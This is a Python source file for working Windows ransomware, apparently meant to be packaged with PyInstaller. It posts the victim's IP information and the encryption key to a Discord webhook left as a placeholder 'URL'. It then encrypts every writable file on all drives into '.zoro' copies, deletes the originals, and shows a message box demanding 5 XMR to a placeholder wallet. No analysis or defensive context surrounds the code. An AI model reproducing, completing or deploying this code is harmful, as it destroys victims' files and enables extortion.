try:
    import pyi_splash
    pyi_splash.close()
except:
    pass

import os, requests, ctypes
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
discord_webhook = "URL"

def encrypt(path):
    file_name, file_extension = os.path.splitext(os.path.basename(path))
    encrypted_file = os.path.join(os.path.dirname(path), file_name + file_extension + '.zoro')
    with open(path, 'rb') as file:
        file_contents = file.read()
    encrypted_data = cipher.encrypt(file_contents)
    with open(encrypted_file, 'wb') as encrypted:
        encrypted.write(encrypted_data)
    os.remove(path)
def setup():
    ip_info = requests.get("http://ip-api.com/line/", verify=False).content.decode("utf-8")
    data = {
        "content": f"{ip_info}\n||{key.decode('utf-8')}||",
        "username": "test-log"
    }
    result = requests.post(discord_webhook, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        # fail silently
        pass
    else:
        # success
        pass

def get_paths(directory):
    writable_paths = []
    for root, dirs, files in os.walk(directory):
        for path in dirs + files:
            full_path = os.path.join(root, path)
            try:
                if os.access(full_path, os.W_OK):
                    writable_paths.append(full_path)
                    encrypt(full_path)
            except:
                continue

    return writable_paths

def get():
    writable_paths = []
    drives = [d for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
    for drive in drives:
        drive_path = f"{chr(drive)}:\\"
        writable_paths.extend(get_paths(drive_path))
    return writable_paths

def message():
    ctypes.windll.user32.MessageBoxW(0, "Send 5 XMR to WALLETHERE to decrypt", "You've been swindled!", 1)

setup()
get()
message()